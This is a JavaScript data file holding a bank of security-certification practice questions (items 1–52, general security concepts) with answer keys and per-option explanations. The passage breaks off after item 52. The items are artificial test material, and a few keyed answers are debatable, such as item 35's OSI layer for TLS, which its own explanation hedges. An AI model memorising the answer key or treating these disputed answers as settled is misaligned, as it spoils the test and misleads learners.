export const DOMAINS = {
  GENERAL_SECURITY: "General Security Concepts",
  THREATS: "Threats, Vulnerabilities & Mitigations",
  ARCHITECTURE: "Security Architecture",
  OPERATIONS: "Security Operations",
  PROGRAM_MANAGEMENT: "Security Program Management & Oversight",
};

const G = DOMAINS.GENERAL_SECURITY;
const T = DOMAINS.THREATS;
const A = DOMAINS.ARCHITECTURE;
const O = DOMAINS.OPERATIONS;
const P = DOMAINS.PROGRAM_MANAGEMENT;

export const questions = [
  {id:1,domain:G,question:"Which cryptographic algorithm is asymmetric?",options:["AES","RSA","3DES","Blowfish"],answer:1,explanation:"RSA uses a public/private key pair (asymmetric). The others are all symmetric.",optionExplanations:["AES is a symmetric block cipher using the same key to encrypt and decrypt.","RSA is asymmetric, using a public key to encrypt and a private key to decrypt.","3DES is a symmetric cipher applying DES three times with one to three keys.","Blowfish is a symmetric block cipher, not asymmetric."]},
  {id:2,domain:G,question:"What does AAA stand for in network security?",options:["Authentication, Authorization, Accounting","Access, Authentication, Auditing","Authorization, Accounting, Auditing","Authentication, Access, Accountability"],answer:0,explanation:"AAA = Authentication (verify identity), Authorization (grant access), Accounting (track activity).",optionExplanations:["Correct. AAA covers verifying who you are, what you can do, and logging what you did.","Incorrect. 'Access' and 'Auditing' are not the standard AAA terms.","Incorrect. The first A in AAA is Authentication, not Authorization.","Incorrect. 'Accountability' is a related concept but not the third A in AAA."]},
  {id:3,domain:G,question:"Which principle limits users to only the permissions required for their job?",options:["Separation of duties","Least privilege","Need to know","Job rotation"],answer:1,explanation:"Least privilege restricts access to the minimum needed, reducing attack surface.",optionExplanations:["Separation of duties requires multiple people to complete a sensitive task, not about limiting individual permissions.","Least privilege grants only the minimum access rights necessary to perform job functions.","Need to know is an information-access concept but not the term for minimum permission assignment.","Job rotation moves employees through roles periodically to detect fraud, not to limit permissions."]},
  {id:4,domain:G,question:"Which hashing algorithm produces a 256-bit digest?",options:["MD5","SHA-1","SHA-256","SHA-512"],answer:2,explanation:"SHA-256 produces a 256-bit hash. MD5=128-bit, SHA-1=160-bit, SHA-512=512-bit.",optionExplanations:["MD5 produces a 128-bit digest and is considered cryptographically broken.","SHA-1 produces a 160-bit digest and is deprecated for most uses.","SHA-256 is a member of the SHA-2 family and produces exactly a 256-bit output.","SHA-512 produces a 512-bit digest, twice the size of SHA-256."]},
  {id:5,domain:G,question:"What is the primary purpose of a digital certificate?",options:["Apply symmetric encryption to data stored on disk to protect it from unauthorized physical access","Bind a public key to an identity","Provide a tamper-resistant hardware vault for securely generating and storing private key material","Enable two communicating parties to independently derive a shared secret key over an untrusted channel"],answer:1,explanation:"A digital certificate binds a public key to an identity, verified by a CA.",optionExplanations:["Applying symmetric encryption to data at rest describes full-disk or file encryption; that is not the purpose of a digital certificate.","A digital certificate cryptographically binds a public key to an entity's verified identity.","Tamper-resistant vaults for generating and storing private key material describe hardware security modules (HSMs).","Enabling parties to derive a shared secret key over an untrusted channel describes a Diffie-Hellman key exchange protocol."]},
  {id:6,domain:G,question:"Which protocol provides secure remote command-line access?",options:["Telnet","FTP","SSH","RDP"],answer:2,explanation:"SSH (port 22) encrypts remote shell sessions. Telnet and FTP are unencrypted.",optionExplanations:["Telnet transmits data including credentials in plaintext, making it insecure.","FTP transfers files but does not provide command-line access and sends data unencrypted.","SSH encrypts the entire session including authentication, providing secure remote CLI access.","RDP provides graphical remote desktop access on Windows, not a command-line protocol."]},
  {id:7,domain:G,question:"A user must present a password AND a fingerprint to log in. This is an example of:",options:["Single-factor authentication","Two-factor authentication","Role-based access control","Federated identity"],answer:1,explanation:"Using two different factor types (something you know + something you are) = MFA/2FA.",optionExplanations:["Single-factor authentication requires only one form of verification, such as a password alone.","Two-factor authentication combines two distinct categories of factors; here, knowledge (password) and biometric (fingerprint).","RBAC assigns permissions based on roles, not an authentication mechanism.","Federated identity allows authentication across organizational boundaries using a shared identity provider."]},
  {id:8,domain:G,question:"Which type of security control is an antivirus program?",options:["Preventive","Detective","Corrective","Deterrent"],answer:0,explanation:"Antivirus prevents malware from executing, so it is primarily a preventive control.",optionExplanations:["Antivirus software prevents malware from running by blocking known malicious code before execution.","Detective controls identify threats after the fact, like IDS alerts or log reviews.","Corrective controls restore systems after an incident, like restoring from a backup.","Deterrent controls discourage attacks through warnings or visible security presence."]},
  {id:9,domain:G,question:"What does PKI stand for?",options:["Public Key Infrastructure","Private Key Integration","Protected Key Index","Public Knowledge Interface"],answer:0,explanation:"PKI = Public Key Infrastructure — the framework of CAs, certificates, and policies for managing public keys.",optionExplanations:["Public Key Infrastructure is the correct expansion; it manages digital certificates and public key encryption.","Private Key Integration is not a real term in cryptography.","Protected Key Index is not an established security framework.","Public Knowledge Interface is not a recognized security acronym."]},
  {id:10,domain:G,question:"Which of the following best describes a Certificate Authority (CA)?",options:["A server that stores encrypted passwords","A trusted entity that issues digital certificates","A firewall that filters encrypted traffic","A protocol for key exchange"],answer:1,explanation:"A CA is a trusted third party that signs and issues digital certificates.",optionExplanations:["Password storage is handled by identity providers or directory services, not a CA.","A CA is the correct answer; it verifies identities and signs certificates with its own private key.","Firewalls filter network traffic by port, protocol, or application, not certificates.","Key exchange is handled by protocols like Diffie-Hellman or ECDH, not a CA."]},
  {id:11,domain:G,question:"Which of the following is an example of 'something you have' in MFA?",options:["Password","Fingerprint","Smart card","Security question"],answer:2,explanation:"'Something you have' is a physical token or device, like a smart card or hardware key.",optionExplanations:["A password is 'something you know,' the knowledge factor.","A fingerprint is 'something you are,' the inherence/biometric factor.","A smart card is a physical possession factor — something you carry with you.","A security question is 'something you know,' not a possession factor."]},
  {id:12,domain:G,question:"What is the purpose of a salt in password hashing?",options:["Speed up the hashing process","Prevent rainbow table attacks","Encrypt the password database","Replace the need for hashing"],answer:1,explanation:"A salt is random data added before hashing; it makes precomputed rainbow table attacks infeasible.",optionExplanations:["Salting actually adds slight overhead; it does not speed up hashing.","A unique random salt per password means identical passwords produce different hashes, defeating rainbow tables.","Salting augments hashing but does not encrypt the database; encryption is a separate control.","Salting works alongside hashing — it does not replace it."]},
  {id:13,domain:G,question:"Which access control model uses sensitivity labels and clearances?",options:["Discretionary Access Control (DAC)","Role-Based Access Control (RBAC)","Mandatory Access Control (MAC)","Attribute-Based Access Control (ABAC)"],answer:2,explanation:"MAC uses sensitivity labels (e.g., Top Secret) matched against user clearances, enforced by the OS.",optionExplanations:["DAC lets resource owners set permissions; it does not use sensitivity labels or clearances.","RBAC assigns permissions to roles that users are placed in, not using classification labels.","MAC enforces access based on government-style classification labels and user clearance levels.","ABAC evaluates attributes of users, resources, and environment dynamically, not fixed clearance levels."]},
  {id:14,domain:G,question:"What is the difference between symmetric and asymmetric encryption?",options:["Symmetric encryption uses two mathematically related keys — one for encryption and a different one for decryption","Symmetric uses one shared key; asymmetric uses a key pair","Symmetric encryption is slower and less efficient than asymmetric encryption for all data sizes","Asymmetric encryption is the preferred choice for encrypting large volumes of bulk data efficiently"],answer:1,explanation:"Symmetric: one shared secret key. Asymmetric: public/private key pair. Symmetric is faster for bulk data.",optionExplanations:["Symmetric encryption uses a single shared key for both encryption and decryption; it is asymmetric that uses two mathematically related keys.","Symmetric encryption uses one shared secret while asymmetric uses a mathematically related public/private key pair.","Symmetric encryption is actually much faster than asymmetric, which is why TLS uses asymmetric cryptography only for key exchange.","Asymmetric is too computationally slow for bulk data; symmetric algorithms like AES are used for encrypting large datasets."]},
  {id:15,domain:G,question:"Which protocol is used to authenticate users to a network using tickets?",options:["RADIUS","TACACS+","Kerberos","LDAP"],answer:2,explanation:"Kerberos uses a Key Distribution Center (KDC) to issue tickets for network authentication.",optionExplanations:["RADIUS provides centralized authentication for remote access but does not use tickets.","TACACS+ is a Cisco protocol that separates authentication, authorization, and accounting but does not use tickets.","Kerberos issues Ticket Granting Tickets (TGT) and service tickets via the KDC.","LDAP is a directory access protocol for querying user information, not an authentication ticket system."]},
  {id:16,domain:G,question:"A security team implements a policy requiring two employees to authorize financial transfers. This is an example of:",options:["Least privilege","Separation of duties","Need to know","Mandatory vacation"],answer:1,explanation:"Separation of duties splits critical tasks between two or more people to prevent fraud.",optionExplanations:["Least privilege limits individual permissions; it does not require multiple people for one task.","Separation of duties prevents any single individual from performing a complete sensitive transaction alone.","Need to know restricts access to information based on job requirements, not transaction approval.","Mandatory vacation forces employees to take leave so irregularities can be detected, a different control."]},
  {id:17,domain:G,question:"Which of the following is a stream cipher?",options:["AES","RC4","3DES","Blowfish"],answer:1,explanation:"RC4 is a stream cipher. AES, 3DES, and Blowfish are all block ciphers.",optionExplanations:["AES is a block cipher operating on 128-bit blocks, not a stream cipher.","RC4 is a widely known stream cipher that encrypts one bit or byte at a time.","3DES is a block cipher based on the original DES block cipher.","Blowfish is a block cipher with a variable key length, not a stream cipher."]},
  {id:18,domain:G,question:"What term describes the concept that data should only be modified by authorized parties?",options:["Confidentiality","Integrity","Availability","Non-repudiation"],answer:1,explanation:"Integrity ensures data is accurate and has not been tampered with by unauthorized parties.",optionExplanations:["Confidentiality ensures data is not disclosed to unauthorized parties, not about modification.","Integrity means data remains accurate, consistent, and unaltered except by authorized processes.","Availability ensures systems and data are accessible when needed.","Non-repudiation provides proof of origin, ensuring a sender cannot deny sending a message."]},
  {id:19,domain:G,question:"Which key exchange algorithm allows two parties to establish a shared secret over an insecure channel?",options:["RSA","Diffie-Hellman","AES","SHA-256"],answer:1,explanation:"Diffie-Hellman enables two parties to derive the same shared secret without transmitting it directly.",optionExplanations:["RSA can exchange keys but does so by encrypting the key with a public key, not deriving it jointly.","Diffie-Hellman allows two parties to independently compute the same shared secret over a public channel.","AES is a symmetric encryption algorithm, not a key exchange mechanism.","SHA-256 is a hash function, not a key exchange algorithm."]},
  {id:20,domain:G,question:"What type of certificate is used to secure multiple subdomains under a single domain?",options:["Root certificate","Self-signed certificate","Wildcard certificate","Code signing certificate"],answer:2,explanation:"A wildcard certificate (*.example.com) covers all immediate subdomains of a domain.",optionExplanations:["A root certificate belongs to a CA and signs subordinate certificates; it is not for securing subdomains.","Self-signed certificates are signed by their own private key and not trusted by default by browsers.","A wildcard certificate uses an asterisk (*) as the subdomain placeholder to cover all immediate subdomains.","Code signing certificates verify the identity of software publishers, not websites or subdomains."]},
  {id:21,domain:G,question:"Which of the following best describes non-repudiation?",options:["Applying TLS encryption to data as it travels between a client and server to prevent interception","Preventing a sender from denying they sent a message","Requiring two distinct factor categories at login to significantly reduce the risk of account takeover","Ensuring systems and services remain continuously accessible through redundancy and fault tolerance"],answer:1,explanation:"Non-repudiation provides cryptographic proof of origin so a sender cannot deny an action.",optionExplanations:["Applying TLS encryption to data in transit provides confidentiality; it does not prove who sent the message.","Non-repudiation uses digital signatures to prove a specific party performed an action.","Requiring two factor categories at login is multi-factor authentication; it verifies identity but does not prevent denial of past actions.","Ensuring services remain accessible through redundancy addresses availability, not proof of message origin."]},
  {id:22,domain:G,question:"A company stores passwords using bcrypt. What advantage does bcrypt offer over MD5?",options:["Bcrypt produces significantly shorter hash outputs than MD5, reducing storage requirements in authentication databases","Bcrypt functions as a symmetric block cipher that encrypts passwords using a secret key rather than hashing them","Bcrypt is intentionally slow and includes a work factor","Bcrypt eliminates the need for salting because its algorithm intrinsically prevents rainbow table attacks"],answer:2,explanation:"Bcrypt is designed to be computationally expensive; its work factor can be increased over time to resist brute force.",optionExplanations:["Bcrypt produces longer outputs than MD5's 128-bit digest; brevity is not its advantage — computational cost is.","Bcrypt is a password hashing function, not a symmetric encryption cipher; it is a one-way operation.","The work factor makes bcrypt slow to compute, significantly raising the cost of brute-force attacks.","Bcrypt automatically generates and embeds a unique random salt per hash — it does not eliminate the need for salting."]},
  {id:23,domain:G,question:"Which protocol does 802.1X use for authentication?",options:["RADIUS","Kerberos","LDAP","TACACS+"],answer:0,explanation:"802.1X is a port-based NAC standard that typically uses RADIUS as the backend authentication server.",optionExplanations:["RADIUS is the standard backend authentication server used with 802.1X for network access control.","Kerberos issues tickets within a domain but is not the authentication backend for 802.1X.","LDAP is a directory protocol for looking up user information, not the 802.1X authentication backend.","TACACS+ is used primarily in device administration (routers/switches) not typically as a 802.1X backend."]},
  {id:24,domain:G,question:"What type of control is a security guard at a data center entrance?",options:["Technical","Administrative","Physical","Compensating"],answer:2,explanation:"A security guard is a physical control — a human presence to control physical access.",optionExplanations:["Technical controls are implemented via technology such as firewalls, IDS, or encryption.","Administrative controls are policies, procedures, and training documents.","A security guard is a physical control that directly protects physical access to a facility.","Compensating controls substitute for a primary control when it cannot be implemented."]},
  {id:25,domain:G,question:"Which of the following is an example of a compensating control?",options:["A firewall rule that explicitly denies inbound HTTP traffic on port 80 to reduce web server exposure","Deploying MFA because password-only policies are insufficient","A mandatory annual program that teaches employees to recognize phishing and practice safe security habits","Full-disk encryption applied to laptop drives to protect sensitive data if a device is physically stolen"],answer:1,explanation:"A compensating control substitutes for a required control that cannot be fully implemented.",optionExplanations:["A firewall rule explicitly denying port 80 traffic is a primary preventive technical control, not a substitute for another control.","MFA deployed because single-factor authentication is too risky is a compensating control substituting for a stronger authentication requirement.","A mandatory phishing-awareness training program is an administrative preventive control, not a compensating control.","Full-disk encryption applied to laptops is a primary preventive technical control, not a substitute for another control."]},
  {id:26,domain:G,question:"Which encryption mode turns a block cipher into a stream cipher?",options:["ECB","CBC","CTR","GCM"],answer:2,explanation:"Counter (CTR) mode uses an incrementing counter to generate a keystream, converting a block cipher to stream-like operation.",optionExplanations:["ECB (Electronic Codebook) encrypts each block independently, revealing patterns in plaintext.","CBC (Cipher Block Chaining) XORs each block with the previous ciphertext; it is still block-by-block.","CTR mode generates a keystream from a counter value, making the block cipher behave like a stream cipher.","GCM (Galois/Counter Mode) adds authentication to CTR mode but is also based on counter mode."]},
  {id:27,domain:G,question:"What is the purpose of a hardware security module (HSM)?",options:["Monitor network traffic flows and generate alerts when patterns match known attack signatures","Securely generate, store, and manage cryptographic keys","Perform real-time scanning of endpoint file systems to detect and quarantine malicious software","Verify remote user identities using RADIUS authentication before allowing VPN tunnel establishment"],answer:1,explanation:"An HSM is a dedicated physical device for cryptographic key management and operations.",optionExplanations:["Monitoring network traffic for attack signatures describes an intrusion detection or prevention system, not an HSM.","HSMs are tamper-resistant devices specifically designed for secure key generation, storage, and cryptographic processing.","Real-time scanning of endpoints to detect malware describes EDR and antivirus solutions.","Verifying remote users via RADIUS before VPN access describes a network access control or AAA architecture."]},
  {id:28,domain:G,question:"Which protocol secures email in transit between mail servers?",options:["S/MIME","PGP","STARTTLS","DMARC"],answer:2,explanation:"STARTTLS upgrades a plain SMTP connection to TLS encryption between mail servers.",optionExplanations:["S/MIME encrypts and signs individual email messages end-to-end but does not secure server-to-server transport.","PGP encrypts message content end-to-end between users but not the transport layer between servers.","STARTTLS is used by SMTP servers to negotiate TLS encryption for messages in transit.","DMARC is an email authentication policy to prevent spoofing; it does not encrypt traffic."]},
  {id:29,domain:G,question:"What is the function of OCSP?",options:["Generate time-based one-time passwords using a shared secret and the current Unix timestamp for step-up authentication","Check whether a digital certificate has been revoked","Apply end-to-end encryption and digital signing to email messages so only the intended recipient can read them","Distribute CA-signed public key certificates to requesting entities through a directory query interface"],answer:1,explanation:"OCSP (Online Certificate Status Protocol) allows clients to check in real time if a certificate is revoked.",optionExplanations:["Generating time-based one-time passwords using a shared secret and timestamp describes TOTP (RFC 6238), not OCSP.","OCSP enables real-time certificate revocation checking instead of downloading large, periodically-published CRLs.","Applying end-to-end encryption and digital signing to email messages describes S/MIME or PGP.","Distributing CA-signed certificates through a directory query interface describes LDAP-based certificate distribution."]},
  {id:30,domain:G,question:"Which of the following describes role-based access control (RBAC)?",options:["Access based on data classification labels","Access based on job function","Access decisions made by the resource owner","Access based on user attributes and environment"],answer:1,explanation:"RBAC assigns permissions to roles (e.g., Manager, Admin), and users are placed in roles.",optionExplanations:["Access based on classification labels describes Mandatory Access Control (MAC).","RBAC grants permissions to roles aligned with job functions, making administration scalable.","Resource owner-controlled access describes Discretionary Access Control (DAC).","Attribute-based decisions describe Attribute-Based Access Control (ABAC)."]},
  {id:31,domain:G,question:"Which wireless security protocol replaced WPA2 and added stronger encryption?",options:["WEP","WPA","WPA3","802.11ac"],answer:2,explanation:"WPA3 introduced SAE (Simultaneous Authentication of Equals) and stronger 192-bit encryption for enterprise.",optionExplanations:["WEP is the oldest and most insecure wireless security protocol, deprecated decades ago.","WPA was a temporary fix for WEP's weaknesses and has since been superseded.","WPA3 is the current standard, adding SAE for better authentication and forward secrecy.","802.11ac is a Wi-Fi speed standard (now called Wi-Fi 5), not a security protocol."]},
  {id:32,domain:G,question:"What does TLS provide that SSL does not?",options:["End-to-end data encryption between client and server, which was absent from all versions of SSL","Certificate-based server authentication using a chain of trust from a trusted Certificate Authority","Stronger cipher suites and security fixes","Port-based network access control that verifies device compliance before granting LAN connectivity"],answer:2,explanation:"TLS is the successor to SSL with improved cipher suites, fixed vulnerabilities, and deprecated weak algorithms.",optionExplanations:["Both TLS and SSL provide encryption; the concept of encrypted transport is not something TLS uniquely introduced.","Certificate-based server authentication using a trust chain exists in both SSL and TLS.","TLS includes stronger cipher suites, removed support for weak algorithms, and fixed SSL's known vulnerabilities.","Port-based NAC that verifies device compliance describes 802.1X, which is unrelated to TLS or SSL."]},
  {id:33,domain:G,question:"Which term describes a vulnerability that is unknown to the vendor and has no patch?",options:["Legacy vulnerability","Zero-day","Common vulnerability","Known exploit"],answer:1,explanation:"A zero-day vulnerability is unknown to the vendor; there is no patch available at the time of discovery.",optionExplanations:["Legacy vulnerabilities exist in outdated software that the vendor may no longer support.","A zero-day vulnerability is unknown to the vendor, so no patch exists at time of exploitation.","A 'common vulnerability' is a vague term; known CVEs have been reported to the vendor.","A known exploit means the attack method is documented, usually after a patch is available."]},
  {id:34,domain:G,question:"Which of the following BEST describes data integrity?",options:["Data is restricted so that only explicitly authorized users or systems are permitted to read or access it","Data is accurate and has not been improperly altered","Data and systems remain accessible to authorized users whenever they are legitimately needed","Data is protected from interception during transmission by applying encryption between endpoints"],answer:1,explanation:"Integrity = data has not been tampered with and remains accurate and consistent.",optionExplanations:["Restricting data access to explicitly authorized users describes confidentiality, not integrity.","Integrity ensures data remains accurate, complete, and unmodified by unauthorized parties.","Ensuring data and systems remain accessible whenever legitimately needed describes availability.","Protecting data from interception during transmission by applying encryption addresses confidentiality in transit."]},
  {id:35,domain:G,question:"A web application uses HTTPS. Which layer does TLS operate at?",options:["Network layer","Transport layer","Application layer","Data link layer"],answer:1,explanation:"TLS operates at the Transport layer (Layer 4) of the OSI model, encrypting the session.",optionExplanations:["The network layer (Layer 3) handles IP addressing and routing; TLS does not operate here.","TLS sits between the transport layer and application layer, typically classified at Layer 4-5.","The application layer (Layer 7) is where HTTP operates; TLS secures it from below.","The data link layer (Layer 2) handles MAC addressing and framing, not TLS."]},
  {id:36,domain:G,question:"Which authentication factor is a retina scan?",options:["Something you know","Something you have","Something you are","Somewhere you are"],answer:2,explanation:"Biometric factors like retina scans are 'something you are' — inherence factors.",optionExplanations:["'Something you know' includes passwords, PINs, and security questions.","'Something you have' includes smart cards, tokens, and mobile devices.","A retina scan is a biometric identifier, classified as 'something you are.'","'Somewhere you are' is a location factor such as GPS location or IP geolocation."]},
  {id:37,domain:G,question:"What is the purpose of key escrow?",options:["Publish CA-signed public key certificates to directory servers so authorized parties can retrieve them on demand","Allow a trusted third party to hold a copy of encryption keys","Use ephemeral Diffie-Hellman key exchange parameters to derive a fresh symmetric session key for each TLS connection","Apply a one-way hashing function to passwords and store the resulting digests in an authentication database"],answer:1,explanation:"Key escrow allows a trusted third party (e.g., law enforcement or recovery agent) to access encryption keys when needed.",optionExplanations:["Publishing CA-signed public key certificates to directory servers for retrieval describes PKI certificate distribution, not key escrow.","Key escrow stores a copy of encryption keys with a trusted third party for recovery or legal access.","Using ephemeral Diffie-Hellman parameters to derive a fresh symmetric session key describes TLS key exchange, not key escrow.","Applying a one-way hash to passwords and storing the digests describes password hashing; key escrow is for encryption keys."]},
  {id:38,domain:G,question:"Which of the following is true about elliptic curve cryptography (ECC)?",options:["ECC requires substantially larger key sizes than RSA to achieve an equivalent level of cryptographic security","ECC is a symmetric encryption algorithm that uses the same key for both encryption and decryption operations","ECC provides equivalent security to RSA with much smaller key sizes","ECC is a public-key algorithm used only for key exchange and cannot be applied to create digital signatures"],answer:2,explanation:"ECC provides the same security as RSA with significantly shorter keys, making it efficient for mobile and IoT.",optionExplanations:["ECC requires much smaller keys than RSA; a 256-bit ECC key offers roughly equivalent security to a 3072-bit RSA key.","ECC is an asymmetric (public-key) algorithm that uses mathematically related key pairs, not a single shared secret.","ECC provides equivalent security to RSA at much smaller key sizes, reducing computation and bandwidth overhead.","ECC is widely used for both digital signatures (ECDSA) and key exchange (ECDH), not limited to one purpose."]},
  {id:39,domain:G,question:"What type of attack specifically targets the weakest link in the security chain — humans?",options:["Zero-day attack","SQL injection","Social engineering","Buffer overflow"],answer:2,explanation:"Social engineering manipulates people rather than exploiting technical vulnerabilities.",optionExplanations:["Zero-day attacks exploit unknown software vulnerabilities, not human behavior.","SQL injection is a technical attack against databases through unvalidated input.","Social engineering exploits human psychology — trust, fear, urgency — to gain access or information.","Buffer overflow exploits memory management flaws in software code."]},
  {id:40,domain:G,question:"Which of the following is an administrative security control?",options:["Firewall","Antivirus software","Security policy","CCTV camera"],answer:2,explanation:"Administrative controls are policies, procedures, and guidelines — management-level controls.",optionExplanations:["A firewall is a technical/logical control implemented through technology.","Antivirus software is a technical control deployed on endpoints.","A security policy is an administrative control that defines rules and expectations for behavior.","CCTV is a physical control used for monitoring and recording."]},
  {id:41,domain:G,question:"What is perfect forward secrecy (PFS)?",options:["Each session uses a unique ephemeral key so past sessions stay secure if long-term keys are compromised","Reusing a single long-term symmetric key across all sessions to ensure cryptographic consistency for all connections","Encrypting each data payload with two different keys simultaneously to provide layered cryptographic protection","Archiving all session encryption keys in a hardware security module vault for potential future decryption needs"],answer:0,explanation:"PFS generates a new ephemeral key pair for each session, so compromising one key does not expose past sessions.",optionExplanations:["PFS uses ephemeral keys per session so that compromise of the long-term private key does not decrypt past sessions.","Reusing a single long-term symmetric key across all sessions is the opposite of PFS and means one key compromise exposes all sessions.","Encrypting each payload with two keys simultaneously describes layered or double encryption, not perfect forward secrecy.","Archiving session keys in an HSM vault creates a centralized target; PFS prevents past session decryption by never storing session keys long-term."]},
  {id:42,domain:G,question:"Which of the following is NOT a property of a secure hash function?",options:["Deterministic output","Reversible","Fixed-length output","Collision resistant"],answer:1,explanation:"Hashing is a one-way function; it cannot be reversed. This is a fundamental property.",optionExplanations:["Deterministic output means the same input always produces the same hash — a required property.","Reversibility would make it an encryption function, not a hash; hashing must be one-way.","Fixed-length output regardless of input size is a required hash function property.","Collision resistance means it should be computationally infeasible to find two inputs with the same hash."]},
  {id:43,domain:G,question:"A certificate is revoked before its expiration date. Which mechanism provides the most current revocation status?",options:["CRL","OCSP","LDAP","DNS"],answer:1,explanation:"OCSP provides real-time certificate revocation status, while CRLs can be large and cached.",optionExplanations:["CRLs (Certificate Revocation Lists) are published periodically and may be stale by the time they are checked.","OCSP (Online Certificate Status Protocol) provides real-time, per-certificate revocation checking.","LDAP is a directory protocol for user lookups, not certificate revocation status.","DNS is used for name resolution; DANE can link certs to DNS, but OCSP is the standard revocation check."]},
  {id:44,domain:G,question:"Which statement about symmetric encryption is correct?",options:["It uses separate keys for encryption and decryption","It is slower than asymmetric encryption","It is ideal for bulk data encryption","It provides built-in non-repudiation"],answer:2,explanation:"Symmetric encryption is fast and efficient, making it ideal for encrypting large amounts of data.",optionExplanations:["Symmetric encryption uses the same key for both encryption and decryption.","Symmetric encryption is faster than asymmetric encryption due to simpler mathematical operations.","Symmetric encryption is the correct choice for encrypting large data volumes because of its speed.","Non-repudiation requires asymmetric digital signatures; symmetric encryption does not provide it."]},
  {id:45,domain:G,question:"Which of the following describes steganography?",options:["Transforming plaintext into unreadable ciphertext using a secret key so only authorized parties can read it","Hiding data within another file or medium","Cascading multiple independent encryption algorithms in sequence to provide layered cryptographic protection","Distributing data blocks across multiple storage devices simultaneously to improve redundancy and read performance"],answer:1,explanation:"Steganography conceals the existence of data by hiding it within another file such as an image.",optionExplanations:["Transforming plaintext into ciphertext using a secret key describes symmetric cryptography, not steganography.","Steganography hides secret data inside a carrier file (image, audio, video) to conceal its existence.","Cascading multiple encryption algorithms for layered protection describes cascaded or double encryption, not steganography.","Distributing data blocks across multiple drives for redundancy describes RAID striping, not steganography."]},
  {id:46,domain:G,question:"What does SAML provide in federated identity management?",options:["Applying TLS encryption to password submissions as they travel between the user's browser and the identity provider","Enabling SSO by passing authentication assertions between identity and service providers","Managing the lifecycle of X.509 certificates including issuance, renewal, and revocation across the enterprise","Capturing fingerprint or retina biometric data at authentication time to verify the user's physical identity"],answer:1,explanation:"SAML (Security Assertion Markup Language) passes XML-based authentication assertions to enable SSO across organizations.",optionExplanations:["Applying TLS to password submissions in transit is handled by HTTPS at the transport layer, not SAML.","SAML passes authentication and authorization assertions between identity providers and service providers to enable SSO.","Managing X.509 certificate lifecycle including issuance and revocation is the function of a PKI, not SAML.","Capturing biometric data at authentication time is handled at the identity provider's authentication system; SAML only transports the resulting assertion."]},
  {id:47,domain:G,question:"Which of the following describes a man-in-the-middle (MITM) attack?",options:["An attacker intercepts and possibly alters communication between two parties","An attacker directs massive volumes of traffic from many compromised systems to overwhelm a target server","An attacker systematically submits every possible password combination until successfully authenticating","An attacker writes data past the end of a fixed-size memory buffer to overwrite adjacent memory and execute code"],answer:0,explanation:"MITM attacks intercept communication between two parties, potentially reading or altering the data.",optionExplanations:["In a MITM attack, the attacker positions themselves between communicating parties to intercept or modify messages.","Directing massive volumes of traffic from many compromised systems to overwhelm a target describes a DDoS attack.","Systematically submitting every possible password combination until one succeeds describes a brute force attack.","Writing data past a fixed-size buffer to overwrite memory and execute code describes a buffer overflow attack."]},
  {id:48,domain:G,question:"What is the primary purpose of a VPN?",options:["Absorb volumetric traffic floods by distributing incoming attack packets across distributed scrubbing centers","Create an encrypted tunnel over an untrusted network","Perform continuous behavioral analysis of endpoint processes to detect and quarantine advanced malware","Verify the identity of remote users by validating X.509 certificates issued by an enterprise Certificate Authority"],answer:1,explanation:"A VPN creates an encrypted tunnel so traffic traversing an untrusted network (like the Internet) remains private.",optionExplanations:["Absorbing traffic floods through distributed scrubbing centers describes DDoS mitigation services, not VPNs.","A VPN encapsulates and encrypts traffic so it remains confidential and integral over untrusted networks.","Performing behavioral analysis of endpoint processes to detect advanced malware describes EDR (endpoint detection and response).","Verifying remote users via X.509 certificate validation can be one component of VPN authentication, but it is not the VPN's primary purpose."]},
  {id:49,domain:G,question:"A developer uses HTTPS for a web app but the certificate is self-signed. What is the main risk?",options:["Traffic between the browser and the server will travel in plaintext because self-signed certificates cannot enable TLS","Users cannot verify the server's identity through a trusted CA","The TLS handshake overhead with a self-signed certificate is significantly higher, causing slower page load times","Browser session cookies are rejected by default when the server's certificate is not signed by a trusted CA"],answer:1,explanation:"Self-signed certificates encrypt traffic but are not trusted by browsers — users cannot verify the server's identity.",optionExplanations:["HTTPS still encrypts traffic even with a self-signed certificate; the encryption is functionally identical, only trust is missing.","Without a CA signature, browsers cannot validate the certificate, leaving users unable to verify server identity.","Certificate type does not significantly impact TLS handshake overhead or connection speed; the cryptographic operations are the same.","Session cookies function correctly with self-signed certificates; cookie handling depends on secure attributes, not CA trust."]},
  {id:50,domain:G,question:"Which of the following is the function of an IV (initialization vector) in encryption?",options:["Serve as a substitute for the encryption key to allow decryption without revealing the actual cryptographic secret","Add randomness to the first block to prevent identical ciphertexts","Provide a tamper-resistant storage location for the symmetric decryption key on the encrypting system","Compute a keyed hash of the message to allow the recipient to verify that data has not been tampered with"],answer:1,explanation:"An IV adds randomness so that identical plaintexts encrypted with the same key produce different ciphertexts.",optionExplanations:["An IV is not a substitute for the encryption key; both are independent inputs to the cipher, each serving a different purpose.","An IV ensures that encrypting the same plaintext multiple times with the same key yields different ciphertexts, preventing pattern analysis.","Providing tamper-resistant storage for symmetric keys describes a hardware security module or key store, not an IV.","Computing a keyed hash to verify message integrity describes a message authentication code (MAC) or HMAC, not an IV."]},
  {id:51,domain:G,question:"Which of the following BEST describes a digital signature?",options:["Encrypting the full message content with the recipient's public key so only they can read it with their private key","Encrypting a hash of the message with the sender's private key","Allowing two parties to independently derive the same shared secret value over an insecure public channel","Generating a random symmetric key to encrypt session data after the asymmetric handshake completes"],answer:1,explanation:"A digital signature = hash of message encrypted with sender's private key; recipient decrypts with sender's public key.",optionExplanations:["Encrypting message content with the recipient's public key provides confidentiality; it does not authenticate the sender's identity.","A digital signature encrypts the message digest (hash) with the sender's private key for authenticity and non-repudiation.","Allowing two parties to derive the same shared secret over a public channel describes Diffie-Hellman key exchange.","Generating a random symmetric key for session encryption after an asymmetric handshake describes session key establishment in TLS."]},
  {id:52,domain:G,question:"What is a CRL?",options:["A time-stamped log maintained by authentication servers recording each failed login attempt for audit purposes","A list of certificates that have been revoked before expiration","A prioritized list of cryptographic algorithms a TLS server is configured to accept during cipher negotiation","A repository storing pending certificate signing requests submitted by entities awaiting CA approval"],answer:1,explanation:"A Certificate Revocation List (CRL) is published by a CA listing certificates revoked before their expiry.",optionExplanations:["A time-stamped log of failed login attempts is stored in SIEM or authentication server logs, not a CRL.","A CRL is a CA-maintained list of serial numbers of revoked certificates that should no longer be trusted.","A prioritized list of cryptographic algorithms a TLS server accepts describes a cipher suite configuration, not a CRL.","A repository storing pending certificate signing requests from entities awaiting approval describes a CA request queue, not a CRL."]},
